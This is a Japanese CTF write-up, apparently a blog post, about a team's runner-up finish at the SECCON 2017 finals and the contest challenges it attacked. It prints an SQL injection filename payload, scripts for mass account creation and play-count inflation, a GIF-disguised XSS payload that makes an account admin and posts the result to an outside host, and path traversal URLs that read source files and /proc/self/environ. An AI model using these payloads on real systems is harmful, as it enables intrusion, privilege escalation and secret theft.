{"pageProps":{"article":{"type":"article","slug":"22","body":"**NaruseJun**というチームでSECCON決勝に出ました。\n\n# 決勝\n\nボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！\n\nhttps://twitter.com/_n_ari/status/964678908242157569\n\n# 結果\n\n競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。\n午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。\n**文部科学大臣賞 個人賞**も頂きました。\n\nhttps://twitter.com/yamaha_sn/status/964784430572232705\n\nhttps://twitter.com/yamaha_sn/status/964787478178615302\n\nhttps://twitter.com/sekai67/status/964792274025529345\n\n# Writeup\n\n## 府中\n\nWeb問？\nElectronで書かれた音楽系SNSで、曲をアップロードできたりするようです。\n\n### Attack\n\nアップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。\n\n```sql\n', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n```\n\nのようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。\n\nいろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが`file`テーブル以外へのアクセス権を持っていないように見えました。\n（挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）\n\nで、結局ここから先がわかりませんでした……\nここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？\nわかりません。\n\n### Defence\n\n再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。\n\n1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。\n適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。\n\n再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、\nストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。\nアプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。\n\n#### 再生数を増やすNode.js向けスクリプト\n\n```js\nvar PromiseSocket = require('promise-socket');\n\nasync function getWAV(streaming_host, streaming_port, song, api_key) {\n    return new Promise(async (resolve, reject) => {\n        const socket = new PromiseSocket();\n        await socket.connect({\n            host: streaming_host,\n            port: streaming_port\n        });\n        for(let i = 0; i < 100; i++){\n            // '\\x80': select song\n            await socket.write(\"\\x80\");\n            await socket.write(song['unique_id']);\n            await socket.write(api_key);\n            // '\\x82': get WAV File Headers\n            await socket.write(\"\\x82\");\n            await socket.write(\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\");\n            await socket.write(\"\\x81\");\n        }\n        // '\\x90': close connection\n        await socket.write(\"\\x90\");\n        // let result = (await socket.readAll());\n        let result = (await socket.end());\n        resolve(result);\n    });\n}\n\n\n(async _ => {\n    console.log(await getWAV(\"fuchu.koth.seccon\", 8000, {unique_id: process.argv[2]}, process.argv[3]));\n})();\n```\n\n#### アカウントを量産して再生数を稼ぐスクリプト\n\n```sh\nexport FLAG=\"176872aa9e14b27d972e2c56b1ec16db\"\nexport USERID=\"2099\"\nexport APIKEY=\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"\nexport RESP=$(curl -X POST http://fuchu.koth.seccon/files -H \"X-FUCHU-KEY: $APIKEY\" -F \"file=@./po.wav;type=audio/wav\")\nexport UNIQID=$(echo $RESP | sed -E 's/[^:]+:\"([^,]+)\".+/\\1/')\nexport PAYLOAD=$(printf '{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}' $FLAG $UNIQID $USERID)\ncurl -X POST http://fuchu.koth.seccon/songs -H \"X-FUCHU-KEY: $APIKEY\" -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\nwhile true\ndo\n\texport USER=$(head /dev/urandom | md5)\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}' $USER $USER)\n\tcurl -X POST http://fuchu.koth.seccon/users -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}' $USER)\n\texport RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H \"Content-Type: application/json\" --data \"$PAYLOAD\")\n\texport APIKEY=$(echo $RESP | sed -E 's/.+\"(.+)\".+/\\1/')\n\tnode increment.js $UNIQID $APIKEY\ndone\n```\n\nこれらを用いると、ディフェンスキーワードをランキングに載せることができるので、\nチームメイトにお願いして書き込み続けてもらいました。\n\n## 船橋\n\n提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、\nそのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。\n\n教師用データセットも与えられるので、機械学習するのが正攻法？\n他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。\n\nボクが目視でそれっぽい指紋を選んだら通りました。\n競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。\n\n## 幕張\n\nスマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。\n\n後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？\nなんか外と通信しているんだろうなぁというのは分かったんですが、\nELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。\n\n\n## 梅田\n\n画像投稿サイト。Web問。\n\n### Defence\n\nまず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、\nもっともFav数の多いページにキーワードを書き込み続けるだけでした。\n\nどのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、\nそもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、\nそれほど頻繁には変わっていませんでした。\n登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？\n\n```sh\nwhile true\ndo\n\texport CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" > cache\n\texport NAME=$(cat cache | sed -E 's/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/')\n\texport VALUE=$(cat cache | sed -E 's/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/')\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" -d csrf_name=$NAME -d csrf_value=$VALUE -d content=$CONTENT\ndone\n```\n\n### Attack\n\n1つ目のFLAGは、普通に`ID:1`の画像ページに書いてあった。\n\n不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。\nただし、`Content-Security-Policy: script-src 'self'`ヘッダがついているので、\n画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。\n\nこんな感じに、`GIF8`がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。\n\n```js\nGIF8=8;\n\nfetch(\"/admin/users\", {credentials: 'include'})\n.then(r => r.text())\n.then(r => {\n\tconst [,v] = r.match(/name=\"csrf_value\" value=\"(.+?)\"/);\n\tconst [,n] = r.match(/name=\"csrf_name\" value=\"(.+?)\"/);\n\tconst body = `csrf_value=${v}&csrf_name=${n}&name=azon`;\n\treturn fetch(\"/admin/new-admin\", {\n\t\tbody,\n\t\tmethod: \"POST\",\n\t\theaders: {\n\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t\t},\n\t\tcredentials: 'include',\n\t});\n})\n.then(r => r.text())\n.then(r => fetch(\"http://192.168.14.4:8000/users\", {method: \"POST\", body: r}))\n```\n\n管理者のブラウザで適当に`/admin`ページを漁ると、\nどうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。\n管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。\n\nで、更に管理者ページを探すと`/admin/logs`というアプリのログを確認する機能が存在することがわかります。\nこのページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、\nさらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。\n\n管理者で`/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php`としてソースの末尾を見ると、\n4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。\nちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。\n\n環境変数は`/admin/logs?p=/../../../../../../proc/self/environ`で読めます。\n","title":"SECCON2017国内決勝大会に出ました","image":null,"tags":["CTF","SECCON","参加記"],"date":"2018-02-20T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},"description":"NaruseJunというチームでSECCON決勝に出ました。 決勝 ボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！ https://twitt…","content":"<p><strong>NaruseJun</strong>というチームでSECCON決勝に出ました。<h1>決勝</h1><p>ボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！<p><a href=https://twitter.com/_n_ari/status/964678908242157569 rel=\"noopener noreferrer\"target=_blank>https://twitter.com/_n_ari/status/964678908242157569</a><h1>結果</h1><p>競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。 午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。 <strong>文部科学大臣賞 個人賞</strong>も頂きました。<blockquote class=twitter-tweet><p dir=ltr lang=ja><a href=\"https://twitter.com/hashtag/SECCON?src=hash&#38ref_src=twsrc%5Etfw\">#SECCON</a> 2017 全国大会表彰式なう。<br>準優勝 NaruseJun <a href=https://t.co/AO1mHOV3IR>pic.twitter.com/AO1mHOV3IR</a></p>— ヤマハのネットワーク製品 (@yamaha_sn) <a href=\"https://twitter.com/yamaha_sn/status/964784430572232705?ref_src=twsrc%5Etfw\">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><blockquote class=twitter-tweet><p dir=ltr lang=ja><a href=\"https://twitter.com/hashtag/SECCON?src=hash&#38ref_src=twsrc%5Etfw\">#SECCON</a> 2017 全国大会表彰式なう。<br>文部科学大臣賞 チーム賞、個人賞 <a href=https://t.co/tWwvgHVcie>pic.twitter.com/tWwvgHVcie</a></p>— ヤマハのネットワーク製品 (@yamaha_sn) <a href=\"https://twitter.com/yamaha_sn/status/964787478178615302?ref_src=twsrc%5Etfw\">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><blockquote class=twitter-tweet><p dir=ltr lang=ja>(準)優勝です <a href=https://t.co/YD84MRVprd>pic.twitter.com/YD84MRVprd</a></p>— sekai (@sekai67) <a href=\"https://twitter.com/sekai67/status/964792274025529345?ref_src=twsrc%5Etfw\">February 17, 2018</a></blockquote><script async charset=utf8 src=https://platform.twitter.com/widgets.js></script><h1>Writeup</h1><h2>府中</h2><p>Web問？ Electronで書かれた音楽系SNSで、曲をアップロードできたりするようです。<h3>Attack</h3><p>アップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。<pre><code class=\"hljs language-sql\"><span class=hljs-string>', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n</span></code></pre><p>のようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。<p>いろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが<code>file</code>テーブル以外へのアクセス権を持っていないように見えました。 （挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）<p>で、結局ここから先がわかりませんでした…… ここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？ わかりません。<h3>Defence</h3><p>再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。<p>1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。 適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。<p>再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、 ストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。 アプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。<h4>再生数を増やすNode.js向けスクリプト</h4><pre><code class=\"hljs language-js\"><span class=hljs-keyword>var</span> PromiseSocket = <span class=hljs-built_in>require</span>(<span class=hljs-string>'promise-socket'</span>);\n\n<span class=hljs-keyword>async</span> <span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>getWAV</span>(<span class=hljs-params>streaming_host, streaming_port, song, api_key</span>) </span>{\n    <span class=hljs-keyword>return</span> <span class=hljs-keyword>new</span> <span class=hljs-built_in>Promise</span>(<span class=hljs-keyword>async</span> (resolve, reject) => {\n        <span class=hljs-keyword>const</span> socket = <span class=hljs-keyword>new</span> PromiseSocket();\n        <span class=hljs-keyword>await</span> socket.connect({\n            <span class=hljs-attr>host</span>: streaming_host,\n            <span class=hljs-attr>port</span>: streaming_port\n        });\n        <span class=hljs-keyword>for</span>(<span class=hljs-keyword>let</span> i = <span class=hljs-number>0</span>; i &#60 <span class=hljs-number>100</span>; i++){\n            <span class=hljs-comment>// '\\x80': select song</span>\n            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>\"\\x80\"</span>);\n            <span class=hljs-keyword>await</span> socket.write(song[<span class=hljs-string>'unique_id'</span>]);\n            <span class=hljs-keyword>await</span> socket.write(api_key);\n            <span class=hljs-comment>// '\\x82': get WAV File Headers</span>\n            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>\"\\x82\"</span>);\n            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\"</span>);\n            <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>\"\\x81\"</span>);\n        }\n        <span class=hljs-comment>// '\\x90': close connection</span>\n        <span class=hljs-keyword>await</span> socket.write(<span class=hljs-string>\"\\x90\"</span>);\n        <span class=hljs-comment>// let result = (await socket.readAll());</span>\n        <span class=hljs-keyword>let</span> result = (<span class=hljs-keyword>await</span> socket.end());\n        resolve(result);\n    });\n}\n\n\n(<span class=hljs-keyword>async</span> _ => {\n    <span class=hljs-built_in>console</span>.log(<span class=hljs-keyword>await</span> getWAV(<span class=hljs-string>\"fuchu.koth.seccon\"</span>, <span class=hljs-number>8000</span>, {<span class=hljs-attr>unique_id</span>: process.argv[<span class=hljs-number>2</span>]}, process.argv[<span class=hljs-number>3</span>]));\n})();\n</code></pre><h4>アカウントを量産して再生数を稼ぐスクリプト</h4><pre><code class=\"hljs language-sh\"><span class=hljs-built_in>export</span> FLAG=<span class=hljs-string>\"176872aa9e14b27d972e2c56b1ec16db\"</span>\n<span class=hljs-built_in>export</span> USERID=<span class=hljs-string>\"2099\"</span>\n<span class=hljs-built_in>export</span> APIKEY=<span class=hljs-string>\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"</span>\n<span class=hljs-built_in>export</span> RESP=$(curl -X POST http://fuchu.koth.seccon/files -H <span class=hljs-string>\"X-FUCHU-KEY: <span class=hljs-variable>$APIKEY</span>\"</span> -F <span class=hljs-string>\"file=@./po.wav;type=audio/wav\"</span>)\n<span class=hljs-built_in>export</span> UNIQID=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$RESP</span> | sed -E <span class=hljs-string>'s/[^:]+:\"([^,]+)\".+/\\1/'</span>)\n<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}'</span> <span class=hljs-variable>$FLAG</span> <span class=hljs-variable>$UNIQID</span> <span class=hljs-variable>$USERID</span>)\ncurl -X POST http://fuchu.koth.seccon/songs -H <span class=hljs-string>\"X-FUCHU-KEY: <span class=hljs-variable>$APIKEY</span>\"</span> -H <span class=hljs-string>\"Content-Type: application/json\"</span> --data <span class=hljs-string>\"<span class=hljs-variable>$PAYLOAD</span>\"</span>\n\n<span class=hljs-keyword>while</span> <span class=hljs-literal>true</span>\n<span class=hljs-keyword>do</span>\n\t<span class=hljs-built_in>export</span> USER=$(head /dev/urandom | md5)\n\t<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}'</span> <span class=hljs-variable>$USER</span> <span class=hljs-variable>$USER</span>)\n\tcurl -X POST http://fuchu.koth.seccon/users -H <span class=hljs-string>\"Content-Type: application/json\"</span> --data <span class=hljs-string>\"<span class=hljs-variable>$PAYLOAD</span>\"</span>\n\t<span class=hljs-built_in>export</span> PAYLOAD=$(<span class=hljs-built_in>printf</span> <span class=hljs-string>'{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}'</span> <span class=hljs-variable>$USER</span>)\n\t<span class=hljs-built_in>export</span> RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H <span class=hljs-string>\"Content-Type: application/json\"</span> --data <span class=hljs-string>\"<span class=hljs-variable>$PAYLOAD</span>\"</span>)\n\t<span class=hljs-built_in>export</span> APIKEY=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$RESP</span> | sed -E <span class=hljs-string>'s/.+\"(.+)\".+/\\1/'</span>)\n\tnode increment.js <span class=hljs-variable>$UNIQID</span> <span class=hljs-variable>$APIKEY</span>\n<span class=hljs-keyword>done</span>\n</code></pre><p>これらを用いると、ディフェンスキーワードをランキングに載せることができるので、 チームメイトにお願いして書き込み続けてもらいました。<h2>船橋</h2><p>提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、 そのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。<p>教師用データセットも与えられるので、機械学習するのが正攻法？ 他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。<p>ボクが目視でそれっぽい指紋を選んだら通りました。 競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。<h2>幕張</h2><p>スマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。<p>後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？ なんか外と通信しているんだろうなぁというのは分かったんですが、 ELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。<h2>梅田</h2><p>画像投稿サイト。Web問。<h3>Defence</h3><p>まず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、 もっともFav数の多いページにキーワードを書き込み続けるだけでした。<p>どのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、 そもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、 それほど頻繁には変わっていませんでした。 登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？<pre><code class=\"hljs language-sh\"><span class=hljs-keyword>while</span> <span class=hljs-literal>true</span>\n<span class=hljs-keyword>do</span>\n\t<span class=hljs-built_in>export</span> CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H <span class=hljs-string>\"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\"</span> > cache\n\t<span class=hljs-built_in>export</span> NAME=$(cat cache | sed -E <span class=hljs-string>'s/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/'</span>)\n\t<span class=hljs-built_in>export</span> VALUE=$(cat cache | sed -E <span class=hljs-string>'s/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/'</span>)\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H <span class=hljs-string>\"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\"</span> -d csrf_name=<span class=hljs-variable>$NAME</span> -d csrf_value=<span class=hljs-variable>$VALUE</span> -d content=<span class=hljs-variable>$CONTENT</span>\n<span class=hljs-keyword>done</span>\n</code></pre><h3>Attack</h3><p>1つ目のFLAGは、普通に<code>ID:1</code>の画像ページに書いてあった。<p>不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。 ただし、<code>Content-Security-Policy: script-src 'self'</code>ヘッダがついているので、 画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。<p>こんな感じに、<code>GIF8</code>がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。<pre><code class=\"hljs language-js\">GIF8=<span class=hljs-number>8</span>;\n\nfetch(<span class=hljs-string>\"/admin/users\"</span>, {<span class=hljs-attr>credentials</span>: <span class=hljs-string>'include'</span>})\n.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> r.text())\n.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> {\n\t<span class=hljs-keyword>const</span> [,v] = r.match(<span class=hljs-regexp>/name=\"csrf_value\" value=\"(.+?)\"/</span>);\n\t<span class=hljs-keyword>const</span> [,n] = r.match(<span class=hljs-regexp>/name=\"csrf_name\" value=\"(.+?)\"/</span>);\n\t<span class=hljs-keyword>const</span> body = <span class=hljs-string>`csrf_value=<span class=hljs-subst>${v}</span>&#38csrf_name=<span class=hljs-subst>${n}</span>&#38name=azon`</span>;\n\t<span class=hljs-keyword>return</span> fetch(<span class=hljs-string>\"/admin/new-admin\"</span>, {\n\t\tbody,\n\t\t<span class=hljs-attr>method</span>: <span class=hljs-string>\"POST\"</span>,\n\t\t<span class=hljs-attr>headers</span>: {\n\t\t\t<span class=hljs-string>'Content-Type'</span>: <span class=hljs-string>'application/x-www-form-urlencoded'</span>,\n\t\t},\n\t\t<span class=hljs-attr>credentials</span>: <span class=hljs-string>'include'</span>,\n\t});\n})\n.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> r.text())\n.then(<span class=hljs-function><span class=hljs-params>r</span> =></span> fetch(<span class=hljs-string>\"http://192.168.14.4:8000/users\"</span>, {<span class=hljs-attr>method</span>: <span class=hljs-string>\"POST\"</span>, <span class=hljs-attr>body</span>: r}))\n</code></pre><p>管理者のブラウザで適当に<code>/admin</code>ページを漁ると、 どうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。 管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。<p>で、更に管理者ページを探すと<code>/admin/logs</code>というアプリのログを確認する機能が存在することがわかります。 このページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、 さらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。<p>管理者で<code>/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php</code>としてソースの末尾を見ると、 4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。 ちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。<p>環境変数は<code>/admin/logs?p=/../../../../../../proc/self/environ</code>で読めます。"},"__N_SSG":true}